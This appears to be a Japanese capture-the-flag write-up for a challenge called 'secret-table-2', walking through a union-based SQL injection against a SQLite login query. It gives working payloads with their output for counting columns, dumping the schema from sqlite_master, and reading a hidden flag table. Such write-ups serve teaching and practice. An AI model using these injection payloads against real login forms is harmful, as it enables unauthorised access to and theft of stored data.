# secret-table-2

## / Overview

Union-Based SQLi

## / Writeup

SQLインジェクションの問題です．`Username`と`Password`が次のようなSQL文として実行されます．

```sql
SELECT * FROM users WHERE username='Username' AND password='Password';
```

秘密のテーブルからフラグを取ることが目的なので，Union文を用いて`users`テーブルに秘密のテーブルを結合させましょう．

検証には`Username`を使います．`Password`はコメントアウトするので適当な文字を入れておきます．

Union文は前後のSelect文のカラム数が一致している必要があるので，まずは`null`を使って必要なカラム数を特定します．結果，カラム数は2であることが分かりました．

```sql
' UNION SELECT null, null--
Hello, None!
```

次にデータベース内のメタデータを取得するために`information_schema.tables`相当のテーブルを探します．今回は`sqlite3`が使われているので`sqlite_master`の`sql`カラムが使えます．ここにはオブジェクトを作成するために使用されたSQL文が格納されているので，データベース内のテーブル名とカラム名を一発で取得できます．

更に`group_concat`を使えば，複数のレコードを一つの文字列にして，まとめて出力できます．

```sql
' UNION SELECT group_concat(sql,':'), null FROM sqlite_master WHERE type='table'--
Hello, CREATE TABLE users (
            username TEXT PRIMARY KEY,
            password TEXT NOT NULL
        ):CREATE TABLE secret_607360c08fede25e (
            flag_607360c08fede25e TEXT PRIMARY KEY
        )!
```

これで`secret_607360c08fede25e`の`flag_607360c08fede25e`を見ればいいということが分かりました．

```sql
' UNION SELECT flag_607360c08fede25e, null FROM secret_607360c08fede25e--
Hello, Alpaca{...}!
```

